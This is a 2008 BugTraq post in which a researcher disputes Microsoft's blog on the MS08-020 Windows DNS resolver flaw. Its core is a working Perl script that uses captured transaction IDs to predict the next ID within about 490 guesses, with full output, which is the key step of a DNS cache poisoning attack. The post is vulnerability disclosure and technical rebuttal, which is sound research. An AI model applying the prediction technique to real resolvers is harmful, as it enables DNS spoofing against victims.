@@ -1,0 +1,331 @@
+
+Date: Mon, 28 Apr 2008 18:49:06 +0300
+From: Amit Klein <amit.klein@...steer.com>
+To: bugtraq@...urityfocus.com
+Cc: Amit Klein <amit.klein@...steer.com>
+Subject: Microsoft SWI blog inaccuracies
+
+SUBJECT: Microsoft SWI blog inaccuracies
+
+Hello BugTraq
+
+As you know, 3 weeks ago I published my paper, "Microsoft
+Windows DNS Stub Resolver Cache Poisoning" 
+(http://www.trusteer.com/docs/Microsoft_Windows_resolver_DNS_cache_poisoning.pdf), 
+
+simultaneously with Microsoft's release of MS08-020
+(http://www.microsoft.com/technet/security/Bulletin/MS08-020.mspx).
+A day later, Microsoft's Secure Windows
+Initiative (SWI) team published their blog entry for MS08-
+020 
+(http://blogs.technet.com/swi/archive/2008/04/09/ms08-020-how-predictable-is-the-dns-transaction-id.aspx). 
+
+
+Unfortunately, the SWI blog entry contains two serious
+mistakes. The first mistake is an inaccurate description of
+the PRNG used for the Microsoft Windows DNS client
+transaction ID. The second mistake is SWI's claim that
+"attackers cannot predict a guaranteed, known-next TXID
+exactly even with this weakness".
+
+I contacted Microsoft about those mistakes, and while
+Microsoft did not refute my statements, they also refused
+to revise the blog entry. On one hand, I am inclined to tag
+this as a simple unwillingness on the side of the vendor to
+revise its materials and admit its mistakes. On the other
+hand, I cannot ignore the fact that the two mistakes, when
+combined, result in misleading the blog reader about the
+nature and the severity of the problem.
+
+Without further ado, I describe the mistakes, and let you
+be the judge...
+
+The first mistake is in the pseudo code. As opposed to the
+text in the SWI blog, the pseudo code should actually read:
+
+GlobalSeed++;
+GlobalSeed+=(SomeRandomAddress>>6);
+SomeNumber=
+  (WORD)GetTickCount()+GlobalSeed;
+GlobalLastTXID = (SomeNumber%487)+1+GlobalLastTXID);
+XID=GlobalLastTXID^SomeOTHERNumber;
+
+The transformation from SWI's notation to my paper's
+notation is straightforward:
+
+SWI notation            my paper notation
+GlobalSeed            n        
+GetTickCount()            T
+GlobalLastTXID            S
+SomeOTHERNumber        K
+(SomeRandomAddress>>6)     z-1
+XID                    Transaction ID
+
+Naturally, without an accurate description of the PRNG,
+researchers and attackers will not be able to conduct a
+meaningful research of the PRNG and to reproduce other
+people's results.
+
+The second mistake is SWI's claim that "attackers cannot
+predict a guaranteed, known-next TXID exactly even with
+this weakness". However, in my paper I describe exactly how
+to predict, with good accuracy (i.e. up to few dozen
+guesses) the next transaction ID.
+
+The SWI blog would lead one to believe that the only
+predictable bits in the transaction ID are the four high
+ones (due to the serialization of the transaction ID as
+little endian, those bits are serialized in the second
+byte) leaving the transaction ID with practical entropy of
+12 bits (instead of the ideal 16 bits). However, if one
+follows my paper, it's trivial to see that by gathering few
+dozen samples, one can extract K (or very few candidates),
+and one can then predict the 487 possible values for the
+next transaction ID, i.e. the transaction ID entropy is
+less than 9 bits.
+
+But an attacker can do better than this. By having the
+victim load an HTML page crafted by the attacker, the
+attacker can control (to a great extent) the timing of the
+DNS queries, thus the attacker can predict the time delta
+of the next transaction ID generated, from the last sample
+seen, and apply a more fine-grained prediction algorithm
+which may yield few dozen candidates only (i.e. 0-6 bits of
+entropy). This technique is fully described in my paper.
+
+This is in stark contrast to SWI's claims. Furthermore,
+Microsoft did have the full paper (actually, a draft of it
+which contains all the relevant technical information) well
+before the SWI blog was published. So the problem here is
+not an issue of SWI not having access to the paper when
+they wrote their blog entry.
+
+Ironically enough, the first (coarse grained) method can
+actually be demonstrated on the data provided in the SWI
+blog entry. Consider the first 20 TXID entries from that
+blog:
+
+4912
+4613
+a813
+a313
+ee10
+c010
+7a1e
+741e
+b91e
+911f
+af1c
+661d
+181a
+2818
+c419
+4fe7
+d5e4
+6ce5
+f8e2
+b7e0
+
+Now, copy the above data to a file and run the following
+Perl script (which is a revised version of technique #1 in
+my paper, simplified and extended to include the prediction
+step), to obtain candidates for the next value:
+
+
+sub numerically { $a <=> $b}
+
+sub verify_K_optimizer
+{
+    my $K=shift;
+    for (my $m=1;$m<$count;$m++)
+    {
+        if (((($txid[$m]^$K)-($txid[$m-1]^$K)) %
+65536)>487)
+        {
+            return 0;
+        }
+    }
+    return 1;
+}
+
+@txid=();
+
+$count=0;
+open(FD,$ARGV[0]) or die "ERROR: Can't open file $ARGV[0]";
+while(my $line=<FD>)
+{
+    if ($line=~/^([0-9a-fA-F]{2})([0-9a-fA-F]{2})/x)
+    {
+        push @txid,hex($2.$1);
+        $count++;
+    }
+    else
+    {
+        print "Can't parse line at count=$count. Line
+is:\n$line\n";
+    }
+}
+close(FD);
+
+print "INFO: Found $count DNS queries in file.\n";
+
+# Find which bits actually change - this can reduce the
+enumeration space for K.
+my $flipped=0;
+my $first=$txid[0];
+for (my $i=0;$i<$count;$i++)
+{
+    $flipped|=($txid[$i]^$first);
+}
+
+my $msb;
+for ($msb=15;$msb>=0;$msb--)
+{
+    if ($flipped & (1 << $msb))
+    {
+        last;
+    }
+}
+$msb++;
+
+if ($msb<15)
+{
+    printf("WARNING: highest ".(16-$msb)." bits do not
+change - can't extract those K bits. More samples would
+help.\n");
+}
+
+if ($msb==16)
+{
+    $msb=15;
+    printf("INFO: most significant bit of K cannot be
+determined (this is not an issue - see the paper for more
+details).\n");
+}
+
+
+print "INFO: Guessing K now (least significant $msb
+bits)\n";
+
+# Enumerate over K values
+my @cand;
+my %next_val;
+for ($K=0;$K<(1<<$msb);$K++)
+{
+    if (verify_K_optimizer($K))
+    {
+        push @cand,$K;
+        $S=$txid[$count-1]^$K;
+        for ($i=0;$i<487;$i++)
+        {
+            $next_S=($S+$i+1) & 0xFFFF;
+            $v=($next_S^$K);
+        
+    $next_val{(($v<<8)&0xFF00)|(($v>>8)&0x00FF)}=1;
+        }
+    }
+}
+
+print "INFO: ".($#cand+1)." candidates for K found:
+@cand\n\n";
+
+my @sorted=sort numerically (keys %next_val);
+
+print "INFO: ".($#sorted+1)." candidates for next TXID
+value:\n\n";
+foreach $val (@sorted)
+{
+    printf "%04x ",$val;
+}
+print "\n\n";
+
+exit(0);
+
+
+The script result is the following output:
+
+INFO: Found 20 DNS queries in file.
+INFO: most significant bit of K cannot be determined (this
+is not an issue - see the paper for more details).
+INFO: Guessing K now (least significant 15 bits)
+INFO: 4 candidates for K found: 26156 26157 26158 26159
+
+INFO: 490 candidates for next TXID value:
+
+00e1 00ee 01e1 01ee 02e1 02ee 03e1 03ee 04e1 04ee 05e1 05ee
+06e1 06ee 07e1 07ee 08e1 08ee 09e1 09ee 0ae1 0aee 0be1 0bee
+0ce1 0cee 0de1 0dee 0ee1 0eee 0fe1 0fee 10e1 10ee 11e1 11ee
+12e1 12ee 13e1 13ee 14e1 14ee 15e1 15ee 16e1 16ee 17e1 17ee
+18e1 18ee 19e1 19ee 1ae1 1aee 1be1 1bee 1ce1 1cee 1de1 1dee
+1ee1 1eee 1fe1 1fee 20e1 20ee 21e1 21ee 22e1 22ee 23e1 23ee
+24e1 24ee 25e1 25ee 26e1 26ee 27e1 27ee 28e1 28ee 29e1 29ee
+2ae1 2aee 2be1 2bee 2ce1 2cee 2de1 2dee 2ee1 2eee 2fe1 2fee
+30e1 30ee 31e1 31ee 32e1 32ee 33e1 33ee 34e1 34ee 35e1 35ee
+36e1 36ee 37e1 37ee 38e1 38ee 39e1 39ee 3ae1 3aee 3be1 3bee
+3ce1 3cee 3de1 3dee 3ee1 3eee 3fe1 3fee 40e1 40ee 41e1 41ee
+42e1 42ee 43e1 43ee 44e1 44ee 45e1 45ee 46e1 46ee 47e1 47ee
+48e1 48ee 49e1 49ee 4ae1 4aee 4be1 4bee 4ce1 4cee 4de1 4dee
+4ee1 4eee 4fe1 4fee 50e1 50ee 51e1 51ee 52e1 52ee 53e1 53ee
+54e1 54ee 55e1 55ee 56e1 56ee 57e1 57ee 58e1 58ee 59e1 59ee
+5ae1 5aee 5be1 5bee 5ce1 5cee 5de1 5dee 5ee1 5eee 5fe1 5fee
+60e1 60ee 61e1 61ee 62e1 62ee 63e1 63ee 64e1 64ee 65e1 65ee
+66e1 66ee 67e1 67ee 68e1 68ee 69e1 69ee 6ae1 6aee 6be1 6bee
+6ce1 6cee 6de1 6dee 6ee1 6eee 6fe1 6fee 70e1 70ee 71e1 71ee
+72e1 72ee 73e1 73ee 74e1 74ee 75e1 75ee 76e1 76ee 77e1 77ee
+78e1 78ee 79e1 79ee 7ae1 7aee 7be1 7bee 7ce1 7cee 7de1 7dee
+7ee1 7eee 7fe1 7fee 80e0 80e1 81e0 81e1 82e0 82e1 83e0 83e1
+84e0 84e1 85e0 85e1 86e0 86e1 87e0 87e1 88e0 88e1 89e0 89e1
+8ae0 8ae1 8be0 8be1 8ce0 8ce1 8de0 8de1 8ee0 8ee1 8fe0 8fe1
+90e0 90e1 91e0 91e1 92e0 92e1 93e0 93e1 94e0 94e1 95e0 95e1
+96e0 96e1 97e0 97e1 98e0 98e1 99e0 99e1 9ae0 9ae1 9be0 9be1
+9ce0 9ce1 9de0 9de1 9ee0 9ee1 9fe0 9fe1 a0e1 a1e1 a2e1 a3e1
+a4e1 a5e1 a6e1 a7e1 a8e1 a9e1 aae1 abe1 ace1 acee ade1 adee
+aee1 aeee afe1 b0e0 b0e1 b1e0 b1e1 b2e0 b2e1 b3e0 b3e1 b4e0
+b4e1 b5e0 b5e1 b6e0 b6e1 b7e1 b8e1 b9e1 bae1 bbe1 bce1 bde1
+bee1 bfe1 c0e0 c0e1 c1e0 c1e1 c2e0 c2e1 c3e0 c3e1 c4e0 c4e1
+c5e0 c5e1 c6e0 c6e1 c7e0 c7e1 c8e0 c8e1 c9e0 c9e1 cae0 cae1
+cbe0 cbe1 cce0 cce1 cde0 cde1 cee0 cee1 cfe0 cfe1 d0e0 d0e1
+d1e0 d1e1 d2e0 d2e1 d3e0 d3e1 d4e0 d4e1 d5e0 d5e1 d6e0 d6e1
+d7e0 d7e1 d8e0 d8e1 d9e0 d9e1 dae0 dae1 dbe0 dbe1 dce0 dce1
+dde0 dde1 dee0 dee1 dfe0 dfe1 e0e0 e0e1 e1e0 e1e1 e2e0 e2e1
+e3e0 e3e1 e4e0 e4e1 e5e0 e5e1 e6e0 e6e1 e7e0 e7e1 e8e0 e8e1
+e9e0 e9e1 eae0 eae1 ebe0 ebe1 ece0 ece1 ede0 ede1 eee0 eee1
+efe0 efe1 f0e0 f0e1 f1e0 f1e1 f2e0 f2e1 f3e0 f3e1 f4e0 f4e1
+f5e0 f5e1 f6e0 f6e1 f7e0 f7e1 f8e0 f8e1 f9e0 f9e1 fae0 fae1
+fbe0 fbe1 fce0 fce1 fde0 fde1 fee0 fee1 ffe0 ffe1
+
+
+As you can see, the correct next value, 26ee, is indeed in
+the list. So this technique indeed is capable of predicting
+the next value within 490 guesses. Note that while four
+possible K values were singled out, the overall candidate
+list is not 4*487, but rather 487+3 due to the fact that
+the possible keys are consecutive and so the range of
+possible next values greatly overlap among them.
+
+Again, this is just the simplest technique, which assumes
+no information on the timing of the DNS queries. Adding
+some information about timing can improve the accuracy of
+the algorithm (single out just one K, and predict much less
+possible candidates) as well as reduce the sample size
+needed (from ~20 to ~10).
+
+Obviously, therefore, the advice given by SWI does not
+address the issue: 'If you are watching for attacks on the
+wire, continue to look for the same pattern as previous DNS
+spoofing attacks: a steady flood of DNS "replies" with
+thousands of different TXID's targeting a client lookup for
+a single host.' - but we just demonstrated that with 490
+responses (and not "thousands"), the cache can be poisoned,
+and when information about the query timing, this can be
+further reduced to few dozens.
+
+
+So - what do you think? Is this intentional or just a
+lapse? And how does it affect the credibility of the SWI
+blog at large?
+
+Thanks,
+-Amit
+
+
